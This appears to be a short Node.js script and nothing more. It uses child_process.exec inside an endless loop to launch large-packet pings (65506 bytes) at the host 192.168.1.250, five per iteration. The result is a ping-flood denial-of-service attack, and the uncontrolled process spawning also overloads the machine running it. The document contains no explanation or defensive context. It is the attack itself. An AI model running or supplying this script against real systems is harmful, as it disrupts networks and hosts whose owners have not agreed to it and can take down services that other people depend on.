import{exec}from'child_process';
while(true){exec('ping -s 65506 192.168.1.250');exec('ping -s 65506 192.168.1.250');exec('ping -s 65506 192.168.1.250');exec('ping -s 65506 192.168.1.250');exec('ping -s 65506 192.168.1.250');}
